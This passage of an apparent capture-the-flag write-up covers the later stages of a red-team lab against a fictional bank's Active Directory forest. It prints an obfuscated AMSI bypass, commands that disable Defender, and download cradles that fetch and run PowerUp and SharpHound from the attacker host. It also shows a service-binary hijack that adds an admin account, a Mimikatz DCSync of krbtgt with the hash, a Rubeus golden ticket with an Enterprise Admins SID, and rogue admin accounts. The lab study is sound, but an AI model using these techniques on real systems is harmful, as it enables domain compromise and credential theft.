<p>For the first flag, I supplied the hostname WRK1 and wrote the portal-issued UID to <code>C:\Windows\Temp\n0debranch.txt</code>. The portal checked the evidence and emailed the flag. The UID shown below is a placeholder; each submission must use the value and location requested by the portal.</p>

<p>I followed the portal's individual instructions for flags 2 and 3 as well. At this point, I still had the Active Directory environment to work through.</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-26-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-26-figure-01.png" alt="Flag submission workflow" width="1016" height="520" loading="lazy"></a></figure>

<pre><code>echo XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX &gt; C:\Windows\Temp\n0debranch.txt</code></pre>
</section>

<!-- PDF page 27 -->
<section id="pdf-page-27" class="pdf-source-section" data-pdf-page="27" aria-label="Source page 27">
<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-27-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-27-figure-01.png" alt="Flag 1 evidence" width="1016" height="566" loading="lazy"></a></figure>

<h3 id="flag-1">Flag 1</h3>

<figure style="width: 75.22%"><a href="/assets/img/posts/red-team-capstone/page-27-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-27-figure-02.png" alt="Flag 1" width="764" height="700" loading="lazy"></a></figure>
</section>

<!-- PDF page 28 -->
<section id="pdf-page-28" class="pdf-source-section" data-pdf-page="28" aria-label="Source page 28">
<h3 id="flag-2">Flag 2</h3>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-28-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-28-figure-01.png" alt="Flag 2" width="1016" height="222" loading="lazy"></a></figure>

<h3 id="flag-3">Flag 3</h3>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-28-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-28-figure-02.png" alt="Flag 3" width="1016" height="184" loading="lazy"></a></figure>

<p>The mailbox delivered the flags and a message from TheReserve's Head of Security.</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-28-figure-03.png"><img src="/assets/img/posts/red-team-capstone/page-28-figure-03.png" alt="Head of Security message" width="1016" height="398" loading="lazy"></a></figure>
</section>

<!-- PDF page 29 -->
<section id="pdf-page-29" class="pdf-source-section" data-pdf-page="29" aria-label="Source page 29">
<p>The first three flags were recorded.</p>

<figure style="width: 73.30%"><a href="/assets/img/posts/red-team-capstone/page-29-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-29-figure-01.png" alt="Flags recorded" width="746" height="436" loading="lazy"></a></figure>

<p>Both recovered accounts could access WRK1 and WRK2.</p>

<p>The portal updated the network diagram after those submissions.</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-29-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-29-figure-02.png" alt="Updated network diagram" width="1016" height="422" loading="lazy"></a></figure>

<p>The diagram now displayed:</p>

<ul><li>Server 1 (.31)</li><li>Server 2 (.32)</li><li>CORPDC .102</li></ul>

<p>The VPN routes from Kali covered WRK1 (.21) and WRK2 (.22). I used sessions on those workstations to move further into the network.</p>

<p>The initial checks looked similar for both users. PowerUp later listed local administrative group membership for the account I was using.</p>
</section>

<!-- PDF page 30 -->
<section id="pdf-page-30" class="pdf-source-section" data-pdf-page="30" aria-label="Source page 30">
<h2 id="local-administration">Local Administration and Service Permissions</h2>
<figure style="width: 44.10%"><a href="/assets/img/posts/red-team-capstone/page-30-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-30-figure-01.png" alt="Local administration" width="448" height="840" loading="lazy"></a></figure>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-30-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-30-figure-02.png" alt="Service permissions" width="1016" height="480" loading="lazy"></a></figure>

<p>I initially received an access-denied error when trying to write under the Administrator profile, so I looked at the account and service permissions on WRK1.</p>
</section>

<!-- PDF page 31 -->
<section id="pdf-page-31" class="pdf-source-section" data-pdf-page="31" aria-label="Source page 31">
<p>I hosted PowerUp on Kali and ran its Windows privilege-escalation checks on WRK1.</p>

<p>Before loading PowerUp, I ran the AMSI command below in the PowerShell session.</p>

<p>The AMSI-related command from my session:</p>



<details><summary>AMSI command used during this attempt</summary>
<pre><code>SeT-Item ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  )
( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varIABLE  ( ('1Q'+'2U')
+'zX'  )  -VaL  )."AssEmbly"."GETTYPe"((  "{6}{3}{1}{4}{2}{0}{5}" -
f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),
('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f
't','Sys')+'em')  ) )."getfiElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("
{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f
('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sETVaLUE"(
${n`ULl},${tRuE} )</code></pre>
</details>

<p>I served <code>PowerUp.ps1</code> from the THM directory on Kali using Python's HTTP server. The screenshot shows an HTTP 200 response to WRK1. In the command below, <code><span class="code-key">REPLACE_WITH_CURRENT_KALI_TUNNEL_IP</span></code> needs to be replaced with the reachable address of the Kali machine.</p>

<figure style="width: 88.79%"><a href="/assets/img/posts/red-team-capstone/page-31-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-31-figure-01.png" alt="PowerUp served over HTTP" width="904" height="220" loading="lazy"></a></figure>

<pre><code>$KaliTunnelAddress = &#x27;<span class="code-key">REPLACE_WITH_CURRENT_KALI_TUNNEL_IP</span>&#x27;
IEX (New-Object Net.WebClient).DownloadString(&quot;http://${KaliTunnelAddress}:8080/PowerUp.ps1&quot;)</code></pre>
</section>

<!-- PDF page 32 -->
<section id="pdf-page-32" class="pdf-source-section" data-pdf-page="32" aria-label="Source page 32">
<p>I ran <code>Invoke-PrivescAudit</code> to check the local configuration and service permissions.</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-32-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-32-figure-01.png" alt="Invoke-PrivescAudit output" width="1016" height="644" loading="lazy"></a></figure>

<p>PowerUp listed local administrative group membership, unquoted service paths, and writable service files. I chose the Backup service because its executable was writable.</p>

<p>I used <code>Install-ServiceBinary</code> to back up and replace the Backup service executable.</p>

<p>The replacement ran a command to create a local account and add it to Administrators. I tried restarting the service and received a service-start error, but the account had been created. I checked its group membership and signed in with it.</p>



<pre><code>Install-ServiceBinary -Name &#x27;Backup&#x27; -Command &quot;net user n0debranch Passwd123! /add &amp;&amp; net localgroup <span class="code-risk">Administrators</span> n0debranch /add&quot;
Restart-Service -Name &#x27;Backup&#x27; -Force</code></pre>
</section>

<!-- PDF page 33 -->
<section id="pdf-page-33" class="pdf-source-section" data-pdf-page="33" aria-label="Source page 33">
<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-33-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-33-figure-01.png" alt="New local admin account" width="1016" height="198" loading="lazy"></a></figure>

<p>I checked that the new local account, <code>n0debranch</code>, belonged to the Administrators group.</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-33-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-33-figure-02.png" alt="Administrators group membership" width="1016" height="488" loading="lazy"></a></figure>

<p>I ended the existing RDP session and signed in with that local account.</p>

<figure style="width: 74.63%"><a href="/assets/img/posts/red-team-capstone/page-33-figure-03.png"><img src="/assets/img/posts/red-team-capstone/page-33-figure-03.png" alt="Signed in as local admin" width="760" height="298" loading="lazy"></a></figure>

<p>I then wrote the requested evidence file under the Administrator profile.</p>
</section>

<!-- PDF page 34 -->
<section id="pdf-page-34" class="pdf-source-section" data-pdf-page="34" aria-label="Source page 34">
<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-34-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-34-figure-01.png" alt="Evidence written under Administrator profile" width="1016" height="530" loading="lazy"></a></figure>

<h3 id="flag-4">Flag 4:</h3>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-34-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-34-figure-02.png" alt="Flag 4" width="1016" height="188" loading="lazy"></a></figure>

<p>The updated network diagram:</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-34-figure-03.png"><img src="/assets/img/posts/red-team-capstone/page-34-figure-03.png" alt="Updated network diagram" width="1016" height="422" loading="lazy"></a></figure>
</section>

<!-- PDF page 35 -->
<section id="pdf-page-35" class="pdf-source-section" data-pdf-page="35" aria-label="Source page 35">
<h2 id="domain-enumeration">Domain Discovery and BloodHound</h2>
<p>My next focus was the corporate domain controller.</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-35-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-35-figure-01.png" alt="Domain discovery" width="1016" height="1016" loading="lazy"></a></figure>

<p>With local administrator access on WRK1, I looked up the corporate domain controller.</p>

<p><code>nltest /dsgetdc:<span class="code-key">corp.thereserve.loc</span></code></p>

<p>I ran this command from WRK1 to locate the domain controller for <code><span class="code-key">corp.thereserve.loc</span></code>.</p>
</section>

<!-- PDF page 36 -->
<section id="pdf-page-36" class="pdf-source-section" data-pdf-page="36" aria-label="Source page 36">
<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-36-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-36-figure-01.png" alt="nltest result" width="1016" height="190" loading="lazy"></a></figure>

<p>The result identified CORPDC at 10.200.40.102.</p>

<p>I used SharpHound to collect Active Directory data and BloodHound to explore group membership, permissions, and relationships.</p>

<p>From an elevated PowerShell session, I ran the following commands to turn off Defender's real-time monitoring and downloaded-file scanning.</p>

<pre><code>Set-MpPreference -<span class="code-risk">DisableRealtimeMonitoring</span> $true
Set-MpPreference -DisableIOAVProtection $true</code></pre>

<figure style="width: 85.40%"><a href="/assets/img/posts/red-team-capstone/page-36-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-36-figure-02.png" alt="Set-MpPreference" width="868" height="342" loading="lazy"></a></figure>

<p>I placed the legacy SharpHound PowerShell collector in the Kali HTTP directory.</p>

<p>Kali, from the directory containing the collector:</p>



<pre><code>python3 -m http.server 8080</code></pre>
</section>

<!-- PDF page 37 -->
<section id="pdf-page-37" class="pdf-source-section" data-pdf-page="37" aria-label="Source page 37">
<p>On WRK1, I loaded the legacy PowerShell collector:</p>

<pre><code>$KaliTunnelAddress = &#x27;<span class="code-key">REPLACE_WITH_CURRENT_KALI_TUNNEL_IP</span>&#x27;
IEX (New-Object Net.WebClient).DownloadString(&quot;http://${KaliTunnelAddress}:8080/SharpHound.ps1&quot;)</code></pre>

<pre><code>Invoke-BloodHound -CollectionMethod All -Domain <span class="code-key">corp.thereserve.loc</span> -LDAPUserName laura.wood -LDAPPassword &#x27;Password1@&#x27;</code></pre>

<p>I supplied Laura's domain credentials for LDAP collection while running from the local account.</p>

<p>SharpHound returned an LDAP authentication error. I tried again and also received forest-resolution errors, but collected some data that I later imported into BloodHound.</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-37-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-37-figure-01.png" alt="SharpHound collection errors" width="1016" height="196" loading="lazy"></a></figure>

<p>I copied the resulting data back to Kali through Remmina's shared-folder feature. This was much easier than passing files through HTTP requests.</p>

<figure style="width: 36.43%"><a href="/assets/img/posts/red-team-capstone/page-37-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-37-figure-02.png" alt="Remmina shared folder" width="370" height="518" loading="lazy"></a></figure>

<p>The shared folder simplified subsequent file transfers.</p>
</section>

<!-- PDF page 38 -->
<section id="pdf-page-38" class="pdf-source-section" data-pdf-page="38" aria-label="Source page 38">
<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-38-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-38-figure-01.png" alt="File transfer" width="1016" height="676" loading="lazy"></a></figure>

<p>I imported the collected data into BloodHound.</p>

<p>I used <code>start-bloodhound</code> with a Neo4j-based setup. The <a href="https://bloodhound.specterops.io/collect-data/ce-collection/sharphound">current SharpHound documentation</a> covers Community Edition.</p>

<p>I extracted and imported the JSON files from the collected archive.</p>

<p>When I looked for a path from Laura's account to Domain Admin, the graph already showed privileged membership.</p>
</section>

<!-- PDF page 39 -->
<section id="pdf-page-39" class="pdf-source-section" data-pdf-page="39" aria-label="Source page 39">
<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-39-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-39-figure-01.png" alt="BloodHound graph" width="1016" height="428" loading="lazy"></a></figure>

<p>BloodHound showed Laura in Domain Admins. The account output also listed that membership.</p>

<figure style="width: 74.48%"><a href="/assets/img/posts/red-team-capstone/page-39-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-39-figure-02.png" alt="Domain Admins membership" width="758" height="298" loading="lazy"></a></figure>
</section>

<!-- PDF page 40 -->
<section id="pdf-page-40" class="pdf-source-section" data-pdf-page="40" aria-label="Source page 40">
<h2 id="unresolved-domain-access">The Unresolved Domain Admin Step</h2>
<figure style="width: 76.70%"><a href="/assets/img/posts/red-team-capstone/page-40-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-40-figure-01.png" alt="Unresolved Domain Admin step" width="780" height="702" loading="lazy"></a></figure>

<p>I suspected another participant had changed Laura's privileges in the shared lab, but I could not tell who had changed them or when.</p>

<p>I continued with Laura's existing Domain Admin access for the root and BANK domain steps.</p>
</section>

<!-- PDF page 41 -->
<section id="pdf-page-41" class="pdf-source-section" data-pdf-page="41" aria-label="Source page 41">
<h2 id="flags-5-8">Flags 5–8</h2>
<p>For flags 5–8, I created the portal-requested evidence files on Server1 and CORPDC: in <code>C:\Windows\Temp</code> for flags 5 and 7, and under <code>C:\Users\Administrator</code> for flags 6 and 8. Select an image to view it at full size.</p>

<div class="flag-grid">
<figure><a href="/assets/img/posts/red-team-capstone/page-42-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-42-figure-01.png" alt="Flag 5 evidence in Windows Temp on Server1" width="1016" height="458" loading="lazy"></a><figcaption>Flag 5 — Server1 · Windows Temp</figcaption></figure>
<figure><a href="/assets/img/posts/red-team-capstone/page-42-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-42-figure-02.png" alt="Flag 6 evidence under Administrator on Server1" width="1016" height="328" loading="lazy"></a><figcaption>Flag 6 — Server1 · Administrator</figcaption></figure>
<figure><a href="/assets/img/posts/red-team-capstone/page-41-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-41-figure-01.png" alt="Flag 7 evidence in Windows Temp on CORPDC" width="1016" height="804" loading="lazy"></a><figcaption>Flag 7 — CORPDC · Windows Temp</figcaption></figure>
<figure><a href="/assets/img/posts/red-team-capstone/page-41-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-41-figure-02.png" alt="Flag 8 evidence under Administrator on CORPDC" width="1016" height="400" loading="lazy"></a><figcaption>Flag 8 — CORPDC · Administrator</figcaption></figure>
</div>
</section>

<!-- PDF page 42 -->
<section id="pdf-page-42" class="pdf-source-section" data-pdf-page="42" aria-label="Source page 42">
<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-42-figure-03.png"><img src="/assets/img/posts/red-team-capstone/page-42-figure-03.png" alt="Additional evidence" width="1016" height="470" loading="lazy"></a></figure>
</section>

<!-- PDF page 43 -->
<section id="pdf-page-43" class="pdf-source-section" data-pdf-page="43" aria-label="Source page 43">
<h2 id="forest-trusts">Forest Trusts and Privileged Access</h2>
<p>The network diagram after the next four flag submissions:</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-43-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-43-figure-01.png" alt="Network diagram" width="1016" height="704" loading="lazy"></a></figure>

<p>The diagram also displayed:</p>

<ul><li>BANKDC .101</li><li>JMP .61</li><li>WORK1 .51</li><li>WORK2 .52</li></ul>

<p>I then examined ROOTDC at 10.200.40.100. The domain names suggested that <code><span class="code-key">thereserve.loc</span></code> was the forest root and that CORP and BANK were child domains.</p>

<p>I queried the domain trusts. The output showed a bidirectional parent-child relationship between CORP and the root domain.</p>

<p><code>([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()</code></p>

<figure style="width: 70.50%"><a href="/assets/img/posts/red-team-capstone/page-43-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-43-figure-02.png" alt="Trust relationships" width="716" height="174" loading="lazy"></a></figure>
</section>

<!-- PDF page 44 -->
<section id="pdf-page-44" class="pdf-source-section" data-pdf-page="44" aria-label="Source page 44">
<p>Using Laura's existing CORP privileges, I retrieved the CORP <code>krbtgt</code> secret for the next step: creating a golden ticket.</p>

<p>I used Mimikatz for the DCSync operation described in its <a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump">lsadump module documentation</a>.</p>

<p>I transferred the lab copy of <a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a> to WRK1.</p>



<p>I ran the DCSync command below in Laura's domain context on WRK1.</p>

<pre><code>.\mimikatz.exe &quot;<span class="code-risk">lsadump::dcsync</span> /domain:<span class="code-key">corp.thereserve.loc</span> /user:CORP\krbtgt&quot; &quot;exit&quot;</code></pre>
</section>

<!-- PDF page 45 -->
<section id="pdf-page-45" class="pdf-source-section" data-pdf-page="45" aria-label="Source page 45">
<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-45-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-45-figure-01.png" alt="DCSync output" width="1016" height="910" loading="lazy"></a></figure>

<p>I resolved the root-domain Administrator SID, then extracted its domain portion for the ticket.</p>

<pre><code>$acct = New-Object System.Security.Principal.NTAccount(&quot;THERESERVE&quot;, &quot;Administrator&quot;)
$accountSid = $acct.Translate([System.Security.Principal.SecurityIdentifier])
$accountSid.Value
$accountSid.AccountDomainSid.Value</code></pre>

<pre><code><span class="code-key">thereserve.loc</span> (Forest Root)
├── SID: S-1-5-21-1255581842-1300659601-3764024703
│
├── <span class="code-key">corp.thereserve.loc</span> (Child Domain)
│   ├── SID: S-1-5-21-170228521-1485475711-3199862024
│   ├── krbtgt NTLM: 0c757a3445acb94a654554f3ac529ede
│   └── Trust: Bidirectional ParentChild with <span class="code-key">thereserve.loc</span>
│
└── <span class="code-key">bank.thereserve.loc</span> (Child Domain)</code></pre>
</section>

<!-- PDF page 46 -->
<section id="pdf-page-46" class="pdf-source-section" data-pdf-page="46" aria-label="Source page 46">
<pre><code>    ├── SID: S-1-5-21-3455338511-2124712869-1448239061
    └── Trust: Bidirectional ParentChild with <span class="code-key">thereserve.loc</span></code></pre>

<p>A security identifier (SID) identifies a security principal. A domain account or group SID combines the domain SID with a relative identifier (RID). RID 500 identifies the built-in Administrator; RID 519 identifies Enterprise Admins in the forest root. See <a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers">Microsoft's SID reference</a>.</p>

<p>Rubeus was included in the supplied tools. Its <a href="https://github.com/GhostPack/Rubeus">official documentation</a> describes Kerberos ticket creation and import.</p>

<p>I used the CORP key and domain SID to forge a ticket, adding the root-domain Enterprise Admins SID through <code>/sids</code>. <code>/ptt</code> imported it into my current logon session.</p>

<pre><code>.\Rubeus.exe golden /rc4:0c757a3445acb94a654554f3ac529ede /domain:<span class="code-key">corp.thereserve.loc</span> /sid:S-1-5-21-170228521-1485475711-3199862024 /sids:S-1-5-21-1255581842-1300659601-3764024703-519 /user:Administrator /ptt</code></pre>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-46-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-46-figure-01.png" alt="Rubeus golden ticket" width="1016" height="582" loading="lazy"></a></figure>
</section>

<!-- PDF page 47 -->
<section id="pdf-page-47" class="pdf-source-section" data-pdf-page="47" aria-label="Source page 47">
<p>I used <code>klist</code> to view the imported ticket.</p>

<figure style="width: 80.97%"><a href="/assets/img/posts/red-team-capstone/page-47-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-47-figure-01.png" alt="klist output" width="824" height="396" loading="lazy"></a></figure>

<p>I connected to ROOTDC using <code>Enter-PSSession</code>, then created a domain account and added it to Enterprise Admins.</p>

<pre><code>Enter-PSSession -ComputerName <span class="code-key">ROOTDC.THERESERVE.LOC</span>
# The next commands run in the remote ROOTDC session shown in the screenshot.
net user n0debranchEA Passwd123! /add /domain
net group &quot;<span class="code-risk">Enterprise Admins</span>&quot; n0debranchEA /add /domain
net user n0debranchEA /domain</code></pre>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-47-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-47-figure-02.png" alt="ROOTDC domain account" width="1016" height="650" loading="lazy"></a></figure>

<p>I then created another root-domain account and a BANK-domain account, adding each to its domain's Domain Admins group. The screenshots below show the account changes on ROOTDC and BANKDC.</p>
</section>

<!-- PDF page 48 -->
<section id="pdf-page-48" class="pdf-source-section" data-pdf-page="48" aria-label="Source page 48">
<h2 id="remaining-evidence">Collecting the Remaining Flags</h2>
<p>The ROOTDC and BANKDC sessions:</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-48-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-48-figure-01.png" alt="ROOTDC operation" width="1016" height="148" loading="lazy"></a></figure>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-48-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-48-figure-02.png" alt="BANKDC operation" width="1016" height="144" loading="lazy"></a></figure>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-48-figure-03.png"><img src="/assets/img/posts/red-team-capstone/page-48-figure-03.png" alt="Domain account changes" width="1016" height="508" loading="lazy"></a></figure>

<h2 id="flags-9-16">Flags 9–16</h2>
<p>I used the additional root- and BANK-domain access to collect flags 9–16. The evidence is grouped below in flag order. Select an image to view it at full size.</p>
<div class="flag-grid">
<figure id="flag-9"><a href="/assets/img/posts/red-team-capstone/page-49-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-49-figure-02.png" alt="Flag 9" width="1016" height="370" loading="lazy"></a><figcaption>Flag 9</figcaption></figure>
<figure id="flag-10"><a href="/assets/img/posts/red-team-capstone/page-49-figure-03.png"><img src="/assets/img/posts/red-team-capstone/page-49-figure-03.png" alt="Flag 10" width="1016" height="288" loading="lazy"></a><figcaption>Flag 10</figcaption></figure>
<figure id="flag-11"><a href="/assets/img/posts/red-team-capstone/page-50-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-50-figure-01.png" alt="Flag 11" width="1016" height="356" loading="lazy"></a><figcaption>Flag 11</figcaption></figure>
<figure id="flag-12"><a href="/assets/img/posts/red-team-capstone/page-50-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-50-figure-02.png" alt="Flag 12" width="1016" height="304" loading="lazy"></a><figcaption>Flag 12</figcaption></figure>
<figure id="flag-13"><a href="/assets/img/posts/red-team-capstone/page-50-figure-03.png"><img src="/assets/img/posts/red-team-capstone/page-50-figure-03.png" alt="Flag 13" width="1016" height="368" loading="lazy"></a><figcaption>Flag 13</figcaption></figure>
<figure id="flag-14"><a href="/assets/img/posts/red-team-capstone/page-51-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-51-figure-01.png" alt="Flag 14" width="1016" height="444" loading="lazy"></a><figcaption>Flag 14</figcaption></figure>
<figure id="flag-15"><a href="/assets/img/posts/red-team-capstone/page-49-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-49-figure-01.png" alt="Flag 15" width="1016" height="382" loading="lazy"></a><figcaption>Flag 15</figcaption></figure>
<figure id="flag-16"><a href="/assets/img/posts/red-team-capstone/page-48-figure-04.png"><img src="/assets/img/posts/red-team-capstone/page-48-figure-04.png" alt="Flag 16" width="1016" height="448" loading="lazy"></a><figcaption>Flag 16</figcaption></figure>
</div>


</section>

<!-- PDF page 51 -->
<section id="pdf-page-51" class="pdf-source-section" data-pdf-page="51" aria-label="Source page 51">
<h2 id="where-the-attempt-ended">Where the Attempt Ended</h2>


<p>The final recorded network diagram:</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-51-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-51-figure-02.png" alt="Final network diagram" width="1016" height="652" loading="lazy"></a></figure>

<p>The lab reset before I reached the SWIFT stage, and I lost access. I was doing the room for my Certificate IV assessment, so I kept the work from that run rather than starting over in a fresh deployment.</p>

<p>Because this room runs a complex environment, users can vote to reset it when issues start affecting the lab. That user-voted reset is what caused this run to end.</p>

<p>I did not continue through the jump host into the SWIFT application or make the final transfer.</p>

<p>Here is where I got to:</p>
</section>

<!-- PDF page 52 -->
<section id="pdf-page-52" class="pdf-source-section" data-pdf-page="52" aria-label="Results and references">
<h2 id="evidence-and-gaps">Where I Got To</h2>
<div class="table-wrapper"><table>
<thead><tr><th>Stage</th><th>What happened</th></tr></thead>
<tbody>
<tr><td>Reconnaissance</td><td>I scanned the exposed hosts and found staff names, web paths, and the VPN portal.</td></tr>
<tr><td>Corporate access</td><td>I obtained VPN profiles and working credentials, connected to the VPN, and signed in to WRK1 and WRK2.</td></tr>
<tr><td>Local administration</td><td>I replaced the Backup service binary, created a local administrator account, and signed in with it.</td></tr>
<tr><td>Domain discovery</td><td>I collected data with SharpHound, encountered LDAP and forest-resolution errors, and imported the resulting files into BloodHound.</td></tr>
<tr><td>CORP privileges</td><td>Laura already had Domain Admin membership when I checked. I continued with that access; I did not find out how it had been granted.</td></tr>
<tr><td>Root and BANK domains</td><td>I created a ticket, connected to ROOTDC, changed domain accounts, and collected flags through flag 16.</td></tr>
<tr><td>SWIFT</td><td>The lab reset before I reached this stage.</td></tr>
</tbody></table></div>
<p>If I revisit the room, I would start with a fresh deployment, work through CORP privilege escalation, and continue into the SWIFT environment.</p>

<h2 id="lessons-learned">What I Learned</h2>
<p>Remmina's shared folder made moving files much easier. I also had to keep track of my changing VPN address and which account I was using on each host. Next time I would keep clearer notes on those details and the SharpHound errors.</p>
<h2 id="references">References</h2>

<ul>
<li><a href="https://tryhackme.com/room/redteamcapstonechallenge">TryHackMe — Red Team Capstone Challenge</a></li>
<li><a href="https://www.swift.com/about-us/who-we-are">Swift — who we are and how financial messaging works</a></li>
<li><a href="https://nmap.org/book/man-host-discovery.html">Nmap — host discovery</a></li>
<li><a href="https://openvpn.net/community-docs/community-articles/openvpn-2-6-manual/">OpenVPN — 2.6 reference manual</a></li>
<li><a href="https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-signing-overview">Microsoft — SMB signing</a></li>
<li><a href="https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal">Microsoft — Antimalware Scan Interface</a></li>
<li><a href="https://powersploit.readthedocs.io/en/latest/Privesc/Invoke-PrivescAudit/">PowerSploit — Invoke-PrivescAudit</a></li>
<li><a href="https://powersploit.readthedocs.io/en/latest/Privesc/Install-ServiceBinary/">PowerSploit — Install-ServiceBinary</a></li>
<li><a href="https://learn.microsoft.com/en-us/powershell/module/defender/set-mppreference">Microsoft — Set-MpPreference</a></li>
<li><a href="https://github.com/SpecterOps/SharpHound">SpecterOps — SharpHound collector</a></li>
<li><a href="https://bloodhound.specterops.io/collect-data/ce-collection/sharphound">SpecterOps — SharpHound Community Edition documentation</a></li>
<li><a href="https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/domain-join-networking-errors">Microsoft — domain-controller discovery and networking</a></li>
<li><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers">Microsoft — security identifiers and well-known RIDs</a></li>
<li><a href="https://learn.microsoft.com/en-us/windows/win32/adschema/r-ds-replication-get-changes-all">Microsoft — secret-data replication permission</a></li>
<li><a href="https://github.com/gentilkiwi/mimikatz">Mimikatz — official project</a></li>
<li><a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump">Mimikatz — lsadump module</a></li>
<li><a href="https://github.com/GhostPack/Rubeus">Rubeus — official project and command documentation</a></li>
</ul>


</section>
</div>
{% endraw %}
